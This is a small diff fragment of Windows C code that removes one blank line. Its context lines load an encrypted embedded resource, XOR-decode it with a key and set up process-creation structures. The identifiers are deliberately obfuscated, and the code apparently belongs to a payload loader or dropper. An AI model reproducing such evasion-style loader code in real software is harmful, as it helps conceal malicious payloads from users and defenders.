@@ -31,7 +31,6 @@ int main() {
     DWORD c1o2d3e4EncLen;
     loadresbabe("c1o2d3e4Enc", &c1o2d3e4Enc, &c1o2d3e4EncLen);
     XXXoordec(c1o2d3e4Enc, c1o2d3e4EncLen, (unsigned char*)k1e2y6ENC, k1e2y6ENCLen);
-
     STARTUPINFO si = {0};
     PROCESS_INFORMATION pi = {0};
     si.cb = sizeof(si);
